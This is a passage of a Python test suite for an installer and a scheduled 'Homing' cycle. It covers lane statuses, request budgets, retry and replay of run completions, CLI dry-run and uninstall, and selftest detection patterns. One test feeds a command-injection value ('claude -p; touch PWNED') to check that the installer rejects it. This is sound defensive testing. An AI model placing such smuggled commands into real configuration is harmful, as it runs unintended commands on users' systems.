        document["sources"][0]["listing_url_pattern"] = "https://www.example.com/ad/{id}"
        plan, _manifest = self.apply(self.plan_config(
            python=sys.executable, sources=document,
            paths={"config": self.path("cfg2"), "state": self.path("state2"),
                   "logs": self.path("logs2"), "skill": self.path("skills2"),
                   "scheduler": self.path("sched2")}))
        self.config_path = os.path.join(plan.config_dir, "config.json")
        self.run_all_phases()
        extracts = [a for a in self.seen if a[1].endswith("sources.py") and a[2] == "extract"]
        self.assertTrue(extracts)
        for argv in extracts:
            self.assertIn("--revalidate", argv)
            self.assertNotIn("--no-revalidate", argv)

    def test_a_cooldown_is_a_normal_outcome_not_a_failure(self):
        for status in ("SKIPPED-COOLDOWN", "ROBOTS-UNAVAILABLE", "SOURCE-UNCHECKED",
                       "NETWORK-ERROR", "RATE-LIMITED"):
            with self.subTest(status=status):
                self.assertEqual(
                    self.cycle.lane_status(0, {"status": status,
                                               "report_as": "source_unchecked"}),
                    "cooldown")
        self.assertEqual(
            self.cycle.lane_status(0, {"status": "ROBOTS-DISALLOWED",
                                       "report_as": "source_unchecked"}), "blocked")
        for status in ("EMPTY-GENUINE", "NOT-MODIFIED"):
            with self.subTest(status=status):
                self.assertEqual(
                    self.cycle.lane_status(0, {"status": status,
                                               "report_as": "nothing_new"}), "empty")
        self.assertEqual(self.cycle.lane_status(0, {"status": "OK", "report_as": "ok"}), "ok")

    def test_the_request_budget_stops_a_runaway_cycle(self):
        ctx = self.cycle.Ctx(self.config_path)
        ctx.max_calls = 2
        calls = []

        def counting(argv, **kwargs):
            calls.append(argv)
            return FakeResult(0, b"{}\n", b"")

        original = self.cycle.subprocess.run
        self.cycle.subprocess.run = counting
        try:
            for _ in range(6):
                code, _payload, err = self.cycle.call(ctx, "homing.py", "projects")
        finally:
            self.cycle.subprocess.run = original
        self.assertEqual(len(calls), 2)
        self.assertEqual(code, self.cycle.LOCAL)
        self.assertIn("request budget", err)


class CompletionAcknowledgementTests(InstallerCase):
    """A run is finished when Homing says so, and not before."""

    def setUp(self):
        super().setUp()
        self.cycle = load_generated_cycle("homing_cycle_completion_test")
        self.addCleanup(os.unlink, self.cycle.__source_path__)
        self.plan, _manifest = self.apply(self.plan_config(python=sys.executable))
        self.ctx = self.cycle.Ctx(os.path.join(self.plan.config_dir, "config.json"))
        self.project_id = str(uuid.uuid4())
        self.run_id = str(uuid.uuid4())
        self.write_claim()

    def write_claim(self):
        self.ctx.write_json(os.path.join(self.ctx.work, "claim.json"),
                            {"project_id": self.project_id, "run_id": self.run_id,
                             "claim_token": "ct_test"})

    def answer(self, code, stderr=""):
        calls = []

        def fake(ctx, script, *args):
            calls.append((script, args))
            return code, None, stderr

        self.cycle.call = fake
        return calls

    def do_complete(self):
        return self.cycle.complete(self.ctx, self.project_id, self.run_id,
                                   [{"lane": "example-com:sitemap", "status": "ok"}],
                                   {"created": 1}, {"created": 1})

    def pending_files(self):
        return sorted(os.listdir(self.ctx.pending))

    def test_success_clears_the_payload_and_the_claim(self):
        self.answer(self.cycle.OK)
        verdict, code = self.do_complete()
        self.assertEqual((verdict, code), ("success", self.cycle.OK))
        self.assertEqual(self.pending_files(), [])

    def test_a_retryable_failure_keeps_the_payload_and_the_claim(self):
        calls = self.answer(self.cycle.UNAVAILABLE, "Homing returned 503 after 3 attempts")
        verdict, code = self.do_complete()
        self.assertEqual(verdict, "retry")
        self.assertNotEqual(code, self.cycle.OK)
        self.assertEqual(len(calls), self.cycle.IN_RUN_COMPLETE_TRIES)
        names = self.pending_files()
        self.assertIn(self.run_id + ".json", names)
        self.assertIn(self.run_id + ".claim.json", names)
        record = json.load(open(os.path.join(self.ctx.pending, self.run_id + ".json")))
        self.assertFalse(record.get("terminal"))
        self.assertEqual(record["attempts"], self.cycle.IN_RUN_COMPLETE_TRIES)
        self.assertEqual(record["payload"]["status"], "completed")

    def test_an_expired_lease_stops_retrying_and_drops_the_stale_claim(self):
        self.answer(self.cycle.UNAVAILABLE, "unhandled 410 (lease_expired) from POST /x")
        verdict, code = self.do_complete()
        self.assertEqual(verdict, "expired")
        self.assertEqual(code, self.cycle.CONFLICT)
        names = self.pending_files()
        self.assertIn(self.run_id + ".json", names)
        self.assertNotIn(self.run_id + ".claim.json", names)
        record = json.load(open(os.path.join(self.ctx.pending, self.run_id + ".json")))
        self.assertTrue(record["terminal"])

    def test_a_conflict_stops_retrying(self):
        calls = self.answer(self.cycle.UNAVAILABLE, "unhandled 409 (run_taken) from POST /x")
        verdict, code = self.do_complete()
        self.assertEqual(verdict, "conflict")
        self.assertEqual(code, self.cycle.CONFLICT)
        self.assertEqual(len(calls), 1, "a conflict must not be retried")

    def test_unauthorized_stops_everything(self):
        for code_in, stderr in ((self.cycle.AUTH, "401 from Homing"),
                                (self.cycle.FORBIDDEN, "403 from Homing on POST"),
                                (self.cycle.NO_KEY, "no key stored")):
            with self.subTest(code=code_in):
                self.write_claim()
                calls = self.answer(code_in, stderr)
                verdict, code = self.do_complete()
                self.assertEqual(verdict, "unauthorized")
                self.assertIn(code, (self.cycle.AUTH, self.cycle.FORBIDDEN,
                                     self.cycle.NO_KEY))
                self.assertEqual(len(calls), 1, "an unaccepted key must not be retried")

    def test_a_malformed_answer_is_not_success(self):
        self.answer(self.cycle.LOCAL, "cycle: ValueError: not JSON")
        verdict, code = self.do_complete()
        self.assertNotEqual(verdict, "success")
        self.assertNotEqual(code, self.cycle.OK)

    def test_a_missing_claim_is_reported_and_never_reported_as_done(self):
        os.remove(os.path.join(self.ctx.work, "claim.json"))
        self.answer(self.cycle.OK)
        verdict, code = self.do_complete()
        self.assertEqual(verdict, "no-claim")
        self.assertEqual(code, self.cycle.CONFLICT)

    def test_an_interrupted_run_is_replayed_by_the_next_one(self):
        self.answer(self.cycle.UNAVAILABLE, "Homing returned 500")
        self.do_complete()
        self.assertIn(self.run_id + ".json", self.pending_files())

        # The next run: the same payload, acknowledged this time.
        calls = self.answer(self.cycle.OK)
        code = self.cycle.replay_pending(self.ctx)
        self.assertEqual(code, self.cycle.OK)
        self.assertEqual(self.pending_files(), [])
        self.assertTrue(calls)
        self.assertEqual(calls[0][0], "homing.py")
        self.assertIn("run-complete", calls[0][1])
        # Idempotent: the retry names the same run, so Homing's own key deduplicates it.
        self.assertIn(self.run_id, calls[0][1])

    def test_replays_are_bounded(self):
        self.answer(self.cycle.UNAVAILABLE, "Homing returned 500")
        self.do_complete()
        for _ in range(6):
            self.write_claim()
            self.cycle.replay_pending(self.ctx)
        record = json.load(open(os.path.join(self.ctx.pending, self.run_id + ".json")))
        self.assertTrue(record["terminal"])
        self.assertLessEqual(record["attempts"], self.cycle.MAX_COMPLETE_ATTEMPTS)
        before = record["attempts"]
        self.cycle.replay_pending(self.ctx)
        record = json.load(open(os.path.join(self.ctx.pending, self.run_id + ".json")))
        self.assertEqual(record["attempts"], before, "a terminal record kept retrying")

    def test_a_revoked_key_stops_the_cycle_at_the_drain_phase(self):
        self.answer(self.cycle.UNAVAILABLE, "Homing returned 500")
        self.do_complete()
        self.write_claim()
        self.answer(self.cycle.AUTH, "401 from Homing")
        code = self.cycle.phase_drain(self.ctx)
        self.assertEqual(code, self.cycle.AUTH)
        last = json.load(open(os.path.join(self.ctx.state, "last-run.json")))
        self.assertFalse(last["ok"])

    def test_a_pending_completion_is_replayed_before_anything_is_searched(self):
        self.answer(self.cycle.UNAVAILABLE, "Homing returned 500")
        self.do_complete()
        self.write_claim()
        calls = self.answer(self.cycle.OK)
        self.cycle.phase_drain(self.ctx)
        self.assertTrue(calls)
        self.assertIn("run-complete", calls[0][1])

    def test_the_claim_copy_is_owner_only(self):
        self.answer(self.cycle.UNAVAILABLE, "Homing returned 500")
        self.do_complete()
        claim_copy = os.path.join(self.ctx.pending, self.run_id + ".claim.json")
        self.assertEqual(stat.S_IMODE(os.stat(claim_copy).st_mode), 0o600)


# --- the command-line surface ---------------------------------------------------------


class InstallerCliTests(InstallerCase):
    """``--help``, ``--print-config-schema``, ``--dry-run`` and ``--uninstall`` work."""

    def script(self):
        return os.path.join(SCRIPTS_DIR, "install.py")

    def run_installer(self, *args, **kwargs):
        return subprocess.run([sys.executable, self.script()] + list(args),
                              stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                              timeout=120, **kwargs)

    def test_help(self):
        result = self.run_installer("--help")
        self.assertEqual(result.returncode, 0)
        self.assertIn(b"--dry-run", result.stdout)

    def test_print_config_schema_names_the_new_contract(self):
        result = self.run_installer("--print-config-schema")
        self.assertEqual(result.returncode, 0)
        schema = json.loads(result.stdout.decode("utf-8"))
        self.assertIn("invocation_argv", schema["runtime"])
        self.assertIn("unattended_rung0_opt_in", schema)

    def test_dry_run_creates_nothing(self):
        config_path = self.path("plan.json")
        with open(config_path, "w") as handle:
            json.dump(self.plan_config(python=sys.executable), handle)
        result = self.run_installer("--config", config_path, "--dry-run")
        self.assertEqual(result.returncode, 0, result.stdout)
        self.assertIn(b"Nothing was created", result.stdout)
        for name in ("cfg", "state", "logs", "skills"):
            self.assertFalse(os.path.exists(self.path(name)))

    def test_install_then_uninstall_removes_what_it_made(self):
        config_path = self.path("plan.json")
        with open(config_path, "w") as handle:
            json.dump(self.plan_config(python=sys.executable), handle)
        result = self.run_installer("--config", config_path)
        self.assertEqual(result.returncode, 0, result.stdout)
        manifest_path = os.path.join(self.path("state"), "install-manifest.json")
        self.assertTrue(os.path.isfile(manifest_path))

        result = self.run_installer("--manifest", manifest_path, "--uninstall")
        self.assertEqual(result.returncode, 0, result.stdout)
        self.assertFalse(os.path.exists(self.path("cfg")))
        self.assertFalse(os.path.exists(self.path("skills", "homing-check")))
        # The canary proves the uninstall's own shell-free removal touched nothing else.
        self.assert_canary_clean()

    def test_a_hostile_plan_exits_with_the_config_code_and_writes_nothing(self):
        config = self.plan_config(
            scheduler={"kind": "systemd-user"}, isolation_rung=3,
            runtime={"kind": "claude-code", "invocation": "claude -p; touch PWNED"})
        config_path = self.path("plan.json")
        with open(config_path, "w") as handle:
            json.dump(config, handle)
        result = self.run_installer("--config", config_path, "--dry-run", cwd=self.canary)
        self.assertEqual(result.returncode, install.EXIT_CONFIG, result.stdout)
        self.assertFalse(os.path.exists(self.path("sched")))
        self.assertFalse(os.path.exists(self.path("cfg")))
        self.assert_canary_clean()


if __name__ == "__main__":
    unittest.main()


class SelftestFalsePositives(SimpleTestCase):
    """selftest must pass a correct install and still catch a real defect.

    Each of these failed on 100% of installs before: a comment naming install.py,
    a scratch dir the runner deletes, pairing links in state, a store the client
    was never told about, and the word "claude" inside an ordinary path.
    """

    def setUp(self):
        sys.path.insert(0, SCRIPTS_DIR)
        for name in ("selftest", "install"):
            sys.modules.pop(name, None)
        import selftest
        self.selftest = selftest
        self.addCleanup(lambda: sys.path.remove(SCRIPTS_DIR))

    def test_comment_naming_the_installer_is_not_reachability(self):
        line = "# Every value below arrived already quoted from install.py."
        self.assertIsNone(
            self.selftest.INSTALLER_MARKERS.search(self.selftest.strip_comment(line)))

    def test_a_real_installer_call_is_still_caught(self):
        line = 'exec "$BIN/install.py" --config plan.json'
        self.assertIsNotNone(
            self.selftest.INSTALLER_MARKERS.search(self.selftest.strip_comment(line)))

    def test_claude_in_a_path_is_not_a_model_invocation(self):
        line = 'SKILLS=/Users/someone/.claude/skills/homing-check'
        cleaned = self.selftest.without_paths(self.selftest.strip_comment(line))
        self.assertIsNone(self.selftest.MODEL_INVOCATION.search(cleaned))

    def test_a_real_model_invocation_is_still_caught(self):
        line = 'run_bounded 180 claude -p --permission-mode dontAsk'
        cleaned = self.selftest.without_paths(self.selftest.strip_comment(line))
        self.assertIsNotNone(self.selftest.MODEL_INVOCATION.search(cleaned))

    def test_pairing_links_are_allowed_in_state(self):
        self.assertIn("verification_uri", self.selftest.URL_ALLOWED)
        self.assertIn("verification_uri_complete", self.selftest.URL_ALLOWED)

    def test_store_env_comes_from_the_manifest(self):
        env = self.selftest.store_env(
            {"secret_store": {"kind": "file", "path": "/tmp/t", "service": "homing-api-token"}})
        self.assertEqual(env["HOMING_TOKEN_STORE"], "file")
        self.assertEqual(env["HOMING_TOKEN_FILE"], "/tmp/t")
        self.assertEqual(env["HOMING_KEYCHAIN_SERVICE"], "homing-api-token")
